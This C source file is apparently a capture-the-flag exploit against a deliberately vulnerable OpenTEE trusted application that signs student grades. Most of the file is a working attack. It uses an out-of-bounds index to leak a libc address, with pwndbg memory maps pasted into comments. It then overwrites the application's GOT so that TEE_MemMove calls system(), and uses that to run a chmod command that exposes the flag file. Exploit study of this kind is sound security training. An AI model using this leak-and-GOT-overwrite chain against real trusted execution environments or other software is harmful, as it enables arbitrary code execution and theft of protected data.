/* Exploit for the vulnerable TA */

#include "tee_client_api.h"
#include "grade_ca.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}
static void create_64bit_TEEC_Value(TEEC_Value *dest, uint64_t val) {
	dest->a = (val << 32) >> 32;
	dest->b = val >> 32;
}

static const TEEC_UUID uuid = {
	0x11223344, 0xA710, 0x469E, { 0xAC, 0xC8, 0x5E, 0xDF, 0x8C, 0x85, 0x90, 0xE1 }
};

int main()
{
	TEEC_Context context;
	TEEC_Session session;
	TEEC_Operation operation;
	TEEC_SharedMemory in_mem;
	TEEC_SharedMemory out_mem;
	TEEC_Result tee_rv;
	memset((void *)&in_mem, 0, sizeof(in_mem));
	memset((void *)&operation, 0, sizeof(operation));

	printf("Initializing context: ");
	tee_rv = TEEC_InitializeContext(NULL, &context);
	if (tee_rv != TEEC_SUCCESS) {
		printf("TEEC_InitializeContext failed: 0x%x\n", tee_rv);
		exit(tee_rv);
	} else {
		printf("initialized\n");
	}

	/*
	Connect to the TA
	*/
	printf("Openning session: ");
	tee_rv = TEEC_OpenSession(&context, &session, &uuid, TEEC_LOGIN_PUBLIC,
				  NULL, &operation, NULL);
	if (tee_rv != TEEC_SUCCESS) {
		printf("TEEC_OpenSession failed: 0x%x\n", tee_rv);
		exit(tee_rv);
	} else {
		printf("opened\n");
	}

	/*
	Setup memory for the input/output classes
	*/
	struct studentclass* StudentClassInst = (struct studentclass*)malloc(sizeof(struct studentclass)); 
	struct signedStudentclass* signedStudentClassInst = (struct signedStudentclass*)malloc(sizeof(struct signedStudentclass)); 
	memset(StudentClassInst, 0, sizeof(struct studentclass));
	memset(signedStudentClassInst, 0, sizeof(struct signedStudentclass));

	StudentClassInst->students[0].grade = 6;
	memset(StudentClassInst->students[0].firstname, 'A', NAME_LEN-1);
	memset(StudentClassInst->students[0].lastname, 'B', NAME_LEN-1);

	in_mem.buffer = (void*)StudentClassInst;
	in_mem.size = sizeof(struct studentclass);
	in_mem.flags = TEEC_MEM_INPUT;

	/*
	Register shared memory, allows us to read data from TEE or read data from it
	*/
	tee_rv = TEEC_RegisterSharedMemory(&context, &in_mem);
	if (tee_rv != TEE_SUCCESS) {
		printf("Failed to register studentclass shared memory\n");
		exit(tee_rv);
	}

	printf("registered shared memory for student class\n");

	out_mem.buffer = (void*)signedStudentClassInst;
	out_mem.size = sizeof(struct signedStudentclass);
	out_mem.flags = TEEC_MEM_OUTPUT;

	tee_rv = TEEC_RegisterSharedMemory(&context, &out_mem);
	if (tee_rv != TEE_SUCCESS) {
		printf("Failed to register signed studentclass memory\n");
		exit(tee_rv);
	}

	/*
	Now we can start invoking commands
	*/

	memset((void *)&operation, 0, sizeof(operation));
	operation.paramTypes = TEEC_PARAM_TYPES(
		TEEC_MEMREF_WHOLE,
		TEEC_MEMREF_WHOLE,
		TEEC_VALUE_INPUT,
		TEEC_NONE
	);
	operation.params[0].memref.parent = &in_mem;
	operation.params[1].memref.parent = &out_mem;

	/* To find the correct value here, we use the following approach: 
	 * We use a value of `operation.params[2].value.a = 0` and break at
	 *   TEE_MemMove(curSignedStudent,student1,0x10);
	 * Next, we use `vmmap $rsi -A5` to see what is around:
    0x7f1bce5cd000     0x7f1bce5d8000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
►   0x7f1bce5d8000     0x7f1bce5d9000 r--p     1000      0 /dev/shm/45853ttttttttt357805346tttttt1703900914tttt +0x0
    0x7f1bce5d9000     0x7f1bce5db000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f1bce5db000     0x7f1bce5dd000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffd23bac000     0x7ffd23bcd000 rw-p    21000      0 [stack]
	  * The `rw-` of ld is promising to contain a leak. Let's use `leakfind $rsi+0x3000` to search for libc leak:

0x7f1bce5db000+0x18 —▸ 0x7f1bce4e6820 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f1bce5db000+0x20 —▸ 0x7f1bce4e6770 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f1bce5db000+0x28 —▸ 0x7f1bce4e67c0 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f1bce5db000+0x30 —▸ 0x7f1bce4e6940 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7f1bce5db000+0x40 —▸ 0x7f1bce5dc2e0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

pwndbg> info symbol 0x7f1bce4e6820
_dl_catch_exception in section .text of /lib/x86_64-linux-gnu/libc.so.6

pwndbg> vmmap 0x7f1bce4e6820 -B3
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7f1bce36e000     0x7f1bce36f000 rw-p     1000   9000 /opt/OpenTee/lib/libLauncherApi.so.0.0.0
    0x7f1bce36f000     0x7f1bce372000 rw-p     3000      0 [anon_7f1bce36f]
    0x7f1bce372000     0x7f1bce39a000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f1bce39a000     0x7f1bce52f000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6 +0x14c820
    0x7f1bce52f000     0x7f1bce587000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6

pwndbg> p/x 0x7f1bce4e6820-0x7f1bce372000
$1 = 0x174820

     * Great! So, by leaking at byte offset 0x3018 we leak the address of `_dl_catch_exception` which is
	 * at libc base address + 0x174820.
	 * Byte offset 0x3018 translates to 0x3018/0x28=307=0x133 offset of a `struct student` array.
	*/
	operation.params[2].value.a = 0x133;

	printf("Invoking command SIGN_CLASS_STUDENT: \n");
	tee_rv = TEEC_InvokeCommand(&session, SIGN_CLASS_STUDENT, &operation, NULL);
	if (tee_rv != TEEC_SUCCESS && tee_rv != TEEC_ERROR_SECURITY) {
		printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
		exit(tee_rv);
	}
	printf("res: 0x%x\n", tee_rv);
	DumpHex(out_mem.buffer, sizeof(struct signedStudent));

	uint64_t libc_leak = *(uint64_t*)((char*)out_mem.buffer+0x20);
	uint64_t libc_base = libc_leak - 0x174820;
	uint64_t libc_system = libc_base + 0x50d70;
	printf("Found libc base: 0x%lx\n", libc_base);
	printf(" [*] system: 0x%lx\n", libc_system);

	//grade_ta.so is mmaped via dlopen()
	uint64_t grade_ta_base = libc_base + 0x228000;
	uint64_t grade_ta_getRandomByte_got_plt = grade_ta_base + 0x4020;
	printf("Found grade_ta.so base: 0x%lx\n", grade_ta_base);
	printf(" [*] getRandomByte@.got.plt: 0x%lx\n", grade_ta_getRandomByte_got_plt);

	uint64_t ret_0_gadget = grade_ta_base + 0x1284; // xor eax, eax; ret;
	
	//Let's do the arbitrary write
	/*
pwndbg> got -p grade_ta.so
Filtering by lib/objfile path: grade_ta.so
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /opt/OpenTee/lib/TAs/grade_ta.so:
GOT protection: Partial RELRO | Found 11 GOT entries passing the filter
[0x7fc313278018] TEE_CheckMemoryAccessRights -> 0x7fc313028d30 (TEE_CheckMemoryAccessRights) ◂— endbr64
[0x7fc313278020] getRandomByte -> 0x7fc313275260 (getRandomByte) ◂— endbr64
[0x7fc313278028] __stack_chk_fail@GLIBC_2.4 -> 0x7fc313182360 (__stack_chk_fail) ◂— endbr64
[0x7fc313278030] printf@GLIBC_2.2.5 -> 0x7fc3130ac6f0 (printf) ◂— endbr64
[0x7fc313278038] TEE_MemMove -> 0x7fc313028f10 (TEE_MemMove) ◂— endbr64
[0x7fc313278040] TEE_AllocateOperation -> 0x7fc3130320b0 (TEE_AllocateOperation) ◂— endbr64
[0x7fc313278048] __syslog_chk@GLIBC_2.4 -> 0x7fc31316a2e0 (__syslog_chk) ◂— endbr64
[0x7fc313278050] TEE_DigestUpdate -> 0x7fc31302c190 (TEE_DigestUpdate) ◂— endbr64
[0x7fc313278058] calculate_signature -> 0x7fc313275300 (calculate_signature) ◂— endbr64
[0x7fc313278060] TEE_DigestDoFinal -> 0x7fc31302c280 (TEE_DigestDoFinal) ◂— endbr64
[0x7fc313278068] rand@GLIBC_2.2.5 -> 0x7fc313092760 (rand) ◂— endbr64

	typedef union {
		struct {
			void* buffer;
			size_t size;
		} memref;
		struct {
			uint32_t a;
			uint32_t b;
		} value;
	} TEE_Param;
	*/

	memset((void *)&operation, 0, sizeof(operation));
	memset(out_mem.buffer, 0, sizeof(struct signedStudent));
	operation.paramTypes = TEEC_PARAM_TYPES(
		TEEC_MEMREF_WHOLE,
		TEEC_VALUE_INPUT,
		TEEC_NONE,
		TEEC_NONE
	);
	operation.params[0].memref.parent = &in_mem;
	create_64bit_TEEC_Value(&operation.params[1].value, grade_ta_getRandomByte_got_plt); //destination address

	char *payload = (char*)in_mem.buffer;
	*(uint64_t*)(payload+0x00) = ret_0_gadget; // getRandomByte
	*(uint64_t*)(payload+0x08) = ret_0_gadget; // __stack_chk_fail
	*(uint64_t*)(payload+0x10) = ret_0_gadget; // printf@GLIBC
	*(uint64_t*)(payload+0x18) = libc_system;  // TEE_MemMove
	*(uint64_t*)(payload+0x20) = ret_0_gadget; // TEE_AllocateOperation
	//__syslog_chk@glibc will be trashed by calculate_signature()
	//TEE_DigestUpdate   will be trashed by calculate_signature()
	
	printf("Invoking command SIGN_STUDENT (overwriting .got.plt): \n");
	tee_rv = TEEC_InvokeCommand(&session, SIGN_STUDENT, &operation, NULL);
	if (tee_rv != TEEC_SUCCESS && tee_rv != TEEC_ERROR_SECURITY) {
		printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
		exit(tee_rv);
	}
	printf("res: 0x%x\n", tee_rv);
	// DumpHex(out_mem.buffer, sizeof(struct signedStudent));

	memset((void *)&operation, 0, sizeof(operation));
	operation.paramTypes = TEEC_PARAM_TYPES(
		TEEC_MEMREF_WHOLE,
		TEEC_MEMREF_WHOLE,
		TEEC_NONE,
		TEEC_NONE
	);
	memset(in_mem.buffer, 0, sizeof(struct student));
	strcpy(out_mem.buffer, "chmod ugo+r /opt/OpenTee/flag.txt");

	operation.params[0].memref.parent = &in_mem;
	operation.params[1].memref.parent = &out_mem;
	
	printf("Invoking command SIGN_STUDENT (changing flag permissions): \n");
	tee_rv = TEEC_InvokeCommand(&session, SIGN_STUDENT, &operation, NULL);
	if (tee_rv != TEEC_SUCCESS && tee_rv != TEEC_ERROR_SECURITY) {
		printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
		exit(tee_rv);
	}
	printf("res: 0x%x\n", tee_rv);
	// DumpHex(out_mem.buffer, sizeof(struct signedStudent));

	system("cat /opt/OpenTee/flag.txt");
	printf("\n");

	return 0;
}

